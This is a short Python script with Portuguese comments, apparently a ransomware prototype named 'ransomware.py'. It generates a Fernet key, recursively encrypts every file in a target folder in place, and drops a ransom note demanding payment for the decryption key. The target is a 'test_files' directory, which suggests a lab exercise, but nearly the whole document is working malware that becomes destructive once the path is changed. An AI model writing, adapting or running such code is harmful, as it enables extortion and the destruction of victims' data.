from cryptography.fernet import Fernet
import os

# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    # Verifica se o diretório existe para evitar erros
    if not os.path.exists(diretorio):
        print(f"Atenção: A pasta '{diretorio}' não foi encontrada!")
        return lista

    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Evita criptografar o próprio script, a chave e arquivos de sistema
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w", encoding="utf-8") as f:
        f.write("=== SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ===\n\n")
        f.write("Para recuperar seus dados, você precisa da chave de descriptografia.\n")
        f.write("Siga as instruções para o pagamento e envie o comprovante.\n")

# 6. Execução principal
def main():
    # Definimos o diretório alvo
    alvo = "test_files"
    
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos(alvo)
    
    if arquivos:
        for arquivo in arquivos:
            criptografar_arquivo(arquivo, chave)
        
        criar_mensagem_resgate()
        print(f"Sucesso: {len(arquivos)} arquivos criptografados em '{alvo}'.")
    else:
        print("Nenhum arquivo encontrado para criptografar.")

if __name__ == "__main__":
    main()
